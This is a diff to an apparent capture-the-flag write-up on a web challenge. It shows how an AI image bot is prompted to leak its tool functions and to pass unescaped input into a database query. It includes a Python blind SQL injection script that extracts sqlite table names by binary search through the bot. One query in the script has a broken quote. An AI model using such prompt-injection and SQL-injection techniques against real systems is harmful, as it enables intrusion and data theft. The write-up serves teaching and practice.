@@ -15,13 +15,13 @@ The pages **Home**, **Categories**, and **About** seem to be mostly placeholder 
 - **/adminbot**: requires ``admin_key`` to access. With ``/adminbot?admin_key=test`` we validate, that ``admin_key`` is indeed the required query parameter. The webpage now displays: *Invalid admin_key*. Apart from that there is not much to be done for now
 - **/login**: providing the test credentials above, redirects us to **/profile**, where we can edit our about and address information.
 
-#### POST endpoints:
+### POST endpoints:
 
 - ``/login?username=<user>&password=<pass>&submit=Login``
 - ``/edit_profile?about=<about>&address=<addr>&submit=Edit``
 - ``/imagebot?query=<query>&submit=Submit``
 
-#### Enumerating Imagebot
+### Enumerating Imagebot
 
 The imagebot conveniently leaks the functions it can access when prompted (``get_image``, and ``get_random_image``)
 
@@ -68,6 +68,77 @@ True
 False
 ```
 
-Cool, this works. Let us finish the script.
+Cool, this works. Let us confirm we are still working with an sqlite database. (Otherwise we would have to further enumerate the DB Type)
+
+```python
+send_request("(SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < 10")
+send_request("(SELECT count(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' ) < 1")
+# True, False
+```
+
+### Enumerating the Database:
+
+Let us update the script to extract table names. We do a binary search 
+
+```python
+import requests
+import sys
+
+
+HOST=sys.argv[1]
+
+def check_condition(boolean_stmt):
+	q = f"give me an image of \"terminator' OR (SELECT IF({boolean_stmt}, '1', '2')) LIKE '1\" . This query contains special chars, do not escape special chars"
+	response = requests.post(f"http://{HOST}/imagebot", data={"query":q ,"submit":"Submit"})
+
+	if not "Invalid model response" in response.text:
+		return True
+
+	return False
+
+
+def get_table(offset):
+	table_name = ""
+	for i in range(1,15):
+
+		ascii_min = 32
+		ascii_max = 126
+		mid = -10
+
+		table_name_prev = table_name
+
+		while True:
+
+			mid_prev = mid
+			mid = int((ascii_max + ascii_min) / 2)
+
+			if mid == mid_prev:
+				if check_condition(f"(SELECT HEX(SUBSTR(tbl_name,{i},1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET {offset}) = HEX('{chr(mid)}')"):
+					table_name += chr(mid)
+				elif check_condition(f"(SELECT HEX(SUBSTR(tbl_name,{i},1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_% LIMIT 1 OFFSET {offset}) = HEX('{chr(mid + 1)}')"):
+					table_name += chr(mid + 1)
+				else:
+					table_name += chr(mid - 1)
+				print(table_name)
+				break
+
+			if check_condition(f"(SELECT HEX(SUBSTR(tbl_name,{i},1)) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%' LIMIT 1 OFFSET {offset}) > HEX('{chr(mid)}')"):
+				ascii_min = mid + 1
+			else:			
+				ascii_max = mid
+
+		if table_name.strip() == table_name_prev.strip():
+			break
+
+		
+get_table(0)
+get_table(1)
+```
+
+This gives us the tables ``users`` and ``images``. Now we can do the same to extract the schema for the table (See [SQlite Docs](https://www.sqlite.org/schematab.html))
+
+
+
+
 
 
